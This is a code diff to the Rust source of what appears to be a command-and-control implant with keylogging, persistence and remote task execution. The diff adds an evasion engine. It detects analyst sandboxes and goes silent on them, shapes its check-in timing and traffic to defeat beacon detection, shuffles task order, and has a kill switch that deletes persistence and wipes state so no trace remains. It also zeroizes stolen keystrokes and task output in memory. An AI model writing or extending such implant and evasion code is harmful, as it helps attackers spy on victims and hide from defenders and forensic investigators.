@@ -42,10 +42,26 @@ pub struct Beacon {
     /// reads from it while it runs, so the beacon keeps the stream and
     /// sends the chunks as they arrive.
     backgrounds: std::collections::HashMap<String, (String, crate::sessions::Stream)>,
+    /// What the engine thinks the host is.
+    posture: crate::evade::Posture,
+    /// How the host changes the behaviour of the beacon.
+    policy: crate::evade::Policy,
+    /// The state of the evasion engine: the settings, the schedule, the
+    /// shaping and the kill switch.
+    evade: crate::evade::State,
+    /// The window the next check-in is drawn from.
+    window: crate::evade::Window,
+    /// How many buffers the memory hygiene wiped, and how many bytes.
+    wiped_buffers: usize,
+    wiped_bytes: usize,
 }
 
 impl Beacon {
     pub fn new(cfg: Config) -> Self {
+        let evade = crate::evade::load_state();
+        let posture = crate::evade::Posture::classify();
+        let policy = posture.policy(&evade.settings);
+        let window = crate::evade::Window::schedule(cfg.sleep, cfg.jitter);
         Beacon {
             cfg,
             session: None,
@@ -53,6 +69,12 @@ impl Beacon {
             cycles: 0,
             failures: 0,
             backgrounds: std::collections::HashMap::new(),
+            posture,
+            policy,
+            evade,
+            window,
+            wiped_buffers: 0,
+            wiped_bytes: 0,
         }
     }
 
@@ -69,6 +91,16 @@ impl Beacon {
                 if self.cycles >= limit {
                     return Ok(());
                 }
+            }
+            // A host that looks like an analyst's sandbox is a host where
+            // the implant may not answer at all.  The operator decides
+            // whether it does; the default is to keep checking in.
+            if self.policy.silence {
+                self.log("the posture says silence: no check-in");
+                sleep_secs(self.next_interval().saturating_mul(2));
+                // The cycle still counts: a run with a limit has to end.
+                self.cycles += 1;
+                continue;
             }
             match self.run_once() {
                 Ok(true) => {
@@ -101,27 +133,63 @@ impl Beacon {
 
     /// Sleep interval with jitter and obfuscation.
     ///
-    /// The jitter spreads the check-ins around the configured interval:
-    /// uniform in [sleep*(1-j), sleep*(1+j)].  The obfuscation adds an
-    /// occasional long nap on top of it, because a uniform distribution is a
-    /// signature of its own -- a beacon that checks in every 60.4 seconds on
-    /// average is easier to find than one that sometimes sleeps for three
-    /// minutes.
+    /// The interval comes out of the window that was drawn for this cycle:
+    /// the window moves from cycle to cycle, so the gaps arrive in
+    /// clusters instead of spreading evenly over the whole range, and the
+    /// value inside the window is stable for the whole cycle.  The
+    /// obfuscation adds an occasional long nap on top of it, because a
+    /// uniform distribution is a signature of its own -- a beacon that
+    /// checks in every 60.4 seconds on average is easier to find than one
+    /// that sometimes sleeps for three minutes.
     fn next_interval(&self) -> u64 {
-        let base = self.cfg.sleep.max(1) as f64;
-        let j = (self.cfg.jitter.min(90) as f64) / 100.0;
-        let lo = (base * (1.0 - j)).max(1.0);
-        let hi = (base * (1.0 + j)).max(lo);
-        let span = hi - lo;
-        let r = random_unit();
-        let mut interval = (lo + span * r) as u64;
-        if self.cfg.sleep_obfuscate && random_unit() < 0.25 {
+        // The window was drawn for this cycle: the value inside it is
+        // stable, so two timers in the same cycle do not drift apart.
+        let mut interval = self.window.pick();
+        if self.cfg.sleep_obfuscate && self.policy.obfuscate && random_unit() < 0.25 {
             // One check-in in four takes a long nap: 1.5 to 3.5 times the
             // jittered interval.
             let factor = 1.5 + 2.0 * random_unit();
             interval = ((interval as f64) * factor) as u64;
         }
         interval.max(1)
+    }
+
+    /// The interval the schedule of the day and the posture of the host
+    /// stretch the configured one with.
+    fn base_interval(&self) -> u64 {
+        let profile = self.evade.profile.factor(crate::evade::local_time());
+        let factor = (profile * self.policy.sleep_factor).max(0.1);
+        // The schedule may name a base of its own; without one the beacon
+        // uses the interval it was configured with.
+        let base = if self.evade.profile.base > 0 {
+            self.evade.profile.base
+        } else {
+            self.cfg.sleep.max(1)
+        };
+        ((base as f64) * factor) as u64
+    }
+
+    /// The jitter of the check-ins, in percent.
+    fn jitter_pct(&self) -> u32 {
+        (self.cfg.jitter.min(90) + self.policy.jitter_bonus).min(90)
+    }
+
+    /// The reason the kill switch fired, if it did.
+    fn kill_switch(&self) -> Option<String> {
+        self.evade.kill_switch.check()
+    }
+
+    /// Stop the implant for good.
+    ///
+    /// The persistence entries go with it: the machine is left the way it
+    /// was found, and the state of the engine is wiped, so nothing on the
+    /// disk says that the implant was ever here.
+    fn terminate(&mut self, reason: &str) {
+        self.log(&format!("the kill switch fired: {reason}"));
+        let args = upk::map(vec![("method", upk::s("all"))]);
+        let _ = crate::persist::remove(&args);
+        let _ = crate::evade::forget();
+        self.session = None;
     }
 
     fn open_channel(&mut self) -> Result<(), String> {
@@ -197,6 +265,28 @@ impl Beacon {
     }
 
     fn run_once(&mut self) -> Result<bool, String> {
+        // The state of the engine is read again every cycle: the operator
+        // may have armed the kill switch or changed the schedule since
+        // the last check-in.
+        self.evade = crate::evade::load_state();
+        // The kill switch is looked at before anything else: when it
+        // fires, the implant stops existing and does not even talk to the
+        // server again.
+        if let Some(reason) = self.kill_switch() {
+            self.terminate(&reason);
+            return Ok(false);
+        }
+        // The posture is looked at again every now and then: a machine
+        // that was a workstation when the implant started may be a lab
+        // machine now.
+        if self.cycles % 10 == 0 {
+            self.posture = crate::evade::Posture::classify();
+        }
+        self.policy = self.posture.policy(&self.evade.settings);
+        // The window of this cycle is drawn once: the gaps between the
+        // check-ins arrive in clusters instead of spreading evenly over
+        // the whole range.
+        self.window = crate::evade::Window::schedule(self.base_interval(), self.jitter_pct());
         self.session = None;
         self.open_channel()?;
         self.handshake()?;
@@ -232,7 +322,12 @@ impl Beacon {
     /// size of the frame depends on the length prefix of its body, so the
     /// body length is solved for instead of guessed.
     fn pad_pending(&mut self) -> Result<(), String> {
-        let bucket = self.cfg.http_pad as usize;
+        // The shaping decides the size of the frames; the configured
+        // bucket is the fallback.
+        let bucket = match self.evade.shaping.granularity() {
+            Some(size) => size,
+            None => self.cfg.http_pad as usize,
+        };
         if bucket == 0 {
             return Ok(());
         }
@@ -388,10 +483,19 @@ impl Beacon {
         // The server also decides whether the check-in pattern is obfuscated.
         self.cfg.sleep_obfuscate = batch.bool_or("obf", self.cfg.sleep_obfuscate);
 
-        let tasks = match batch.get("tasks") {
+        let mut tasks = match batch.get("tasks") {
             Some(Value::Arr(items)) => items.clone(),
             _ => Vec::new(),
         };
+        if self.evade.shaping.reorder && tasks.len() > 1 {
+            // The order of the operations inside a cycle is shuffled: a
+            // host that always runs the tasks in the order the server
+            // sent them has a signature of its own.
+            for i in (1..tasks.len()).rev() {
+                let j = (crypto::random_bytes(2)[0] as usize) % (i + 1);
+                tasks.swap(i, j);
+            }
+        }
         for (idx, t) in tasks.iter().enumerate() {
             if idx >= MAX_TASKS_PER_CYCLE {
                 break;
@@ -405,10 +509,19 @@ impl Beacon {
                 // the output, so the operator sees that nothing ran.
                 self.log(&format!("task {id} skipped (cancelled)"));
                 let outcome = task::Outcome::err(125, "cancelled before execution");
-                self.send_result(&id, &outcome)?;
+                self.send_result(&id, outcome)?;
                 continue;
             }
             self.log(&format!("task {id} kind={kind}"));
+
+            // The marker of the kill switch: the operator sends it and the
+            // implant stops existing, with its persistence entries.
+            if let Some(reason) = self.evade.kill_switch.marker_fired(&args) {
+                let outcome = task::Outcome::err(0, format!("the kill switch fired: {reason}"));
+                self.send_result(&id, outcome)?;
+                self.terminate(&reason);
+                return Ok(false);
+            }
 
             match kind.as_str() {
                 "keylog" => {
@@ -434,7 +547,7 @@ impl Beacon {
                         }
                         Err(e) => {
                             let outcome = task::Outcome::err(1, e);
-                            self.send_result(&id, &outcome)?;
+                            self.send_result(&id, outcome)?;
                         }
                     }
                 }
@@ -447,11 +560,11 @@ impl Beacon {
                         Ok(report) => {
                             self.log(&format!("key logger writes to {path}"));
                             let outcome = task::Outcome::ok(report.into_bytes());
-                            self.send_result(&id, &outcome)?;
+                            self.send_result(&id, outcome)?;
                         }
                         Err(e) => {
                             let outcome = task::Outcome::err(1, e);
-                            self.send_result(&id, &outcome)?;
+                            self.send_result(&id, outcome)?;
                         }
                     }
                 }
@@ -480,14 +593,29 @@ impl Beacon {
                         }
                         Err(e) => {
                             let outcome = task::Outcome::err(1, e);
-                            self.send_result(&id, &outcome)?;
+                            self.send_result(&id, outcome)?;
                         }
                     }
                 }
                 "exit" | "kill" => {
-                    let outcome = task::run(&self.context(), &kind, &args);
-                    self.send_result(&id, &outcome)?;
+                    // The exit is the last word of the operator: the
+                    // implant takes its persistence entries with it, so the
+                    // machine is left the way it was found.  This is also
+                    // the path the panic task of the server takes.
+                    //
+                    // The entries are removed first and the result reports
+                    // the empty record, so the inventory of the server
+                    // does not keep a lie after the engagement.
+                    let empty = upk::map(vec![("method", upk::s("all"))]);
+                    let _ = crate::persist::remove(&empty);
+                    let report = crate::persist::list(&Value::Null);
+                    let outcome = task::run(&self.context(), &kind, &args)
+                        .with("persist", upk::arr(report.entries))
+                        .with("persist_total", upk::u(0))
+                        .with("persist_broken", upk::u(0));
+                    self.send_result(&id, outcome)?;
                     self.send_bye()?;
+                    self.terminate("the operator ended the engagement");
                     return Ok(false);
                 }
                 "sleep" => {
@@ -495,11 +623,31 @@ impl Beacon {
                     let jitter = args.u64_or("jitter", self.cfg.jitter as u64) as u32;
                     self.apply_policy(sleep, jitter);
                     let outcome = task::run(&self.context(), "sleep", &args);
-                    self.send_result(&id, &outcome)?;
+                    self.send_result(&id, outcome)?;
+                }
+                "hygiene.memory" => {
+                    // The counters of the memory hygiene: the beacon knows
+                    // how many buffers it wiped and how many bytes they
+                    // held.
+                    match crate::hygiene::memory(&args) {
+                        Ok((text, extra)) => {
+                            let mut outcome = task::Outcome::ok(text.into_bytes())
+                                .with("hygiene_wiped", upk::u(self.wiped_buffers as u64))
+                                .with("hygiene_bytes", upk::u(self.wiped_bytes as u64));
+                            for (key, value) in extra {
+                                outcome = outcome.with(key, value);
+                            }
+                            self.send_result(&id, outcome)?;
+                        }
+                        Err(e) => {
+                            let outcome = task::Outcome::err(1, e);
+                            self.send_result(&id, outcome)?;
+                        }
+                    }
                 }
                 _ => {
                     let outcome = task::run(&self.context(), &kind, &args);
-                    self.send_result(&id, &outcome)?;
+                    self.send_result(&id, outcome)?;
                 }
             }
         }
@@ -529,7 +677,7 @@ impl Beacon {
                 finished.push((id.clone(), outcome));
             }
         }
-        for (id, sid, chunk) in pending {
+        for (id, sid, mut chunk) in pending {
             let value = upk::map(vec![
                 ("id", upk::s(&id)),
                 ("code", upk::i(0)),
@@ -540,18 +688,42 @@ impl Beacon {
             ]);
             let frame = self.seal(wire::MSG_RESULT, &value)?;
             self.write(&frame)?;
+            // The keystrokes are wiped after they were sent: the server
+            // has them, and the implant does not need them in memory.
+            self.wiped_buffers += 1;
+            self.wiped_bytes += chunk.len();
+            crypto::zeroize(&mut chunk);
         }
         for (id, outcome) in finished {
             self.backgrounds.remove(&id);
-            self.send_result(&id, &outcome)?;
+            self.send_result(&id, outcome)?;
         }
         Ok(())
     }
 
-    fn send_result(&mut self, task_id: &str, outcome: &task::Outcome) -> Result<(), String> {
+    /// Send the result of a task and wipe the output behind it.
+    ///
+    /// The server has the output, and the implant does not need it in
+    /// memory: the buffer is wiped here, on the happy path and on the
+    /// path where the frame could not be written either.
+    fn send_result(&mut self, task_id: &str, mut outcome: task::Outcome) -> Result<(), String> {
         let value = outcome.to_value(task_id);
-        let frame = self.seal(wire::MSG_RESULT, &value)?;
-        self.write(&frame)
+        let frame = match self.seal(wire::MSG_RESULT, &value) {
+            Ok(frame) => frame,
+            Err(e) => {
+                let mut buffer = std::mem::replace(&mut outcome.out, Vec::new());
+                self.wiped_buffers += 1;
+                self.wiped_bytes += buffer.len();
+                crypto::zeroize(&mut buffer);
+                return Err(e);
+            }
+        };
+        self.write(&frame)?;
+        let mut buffer = std::mem::replace(&mut outcome.out, Vec::new());
+        self.wiped_buffers += 1;
+        self.wiped_bytes += buffer.len();
+        crypto::zeroize(&mut buffer);
+        Ok(())
     }
 
     fn send_bye(&mut self) -> Result<(), String> {
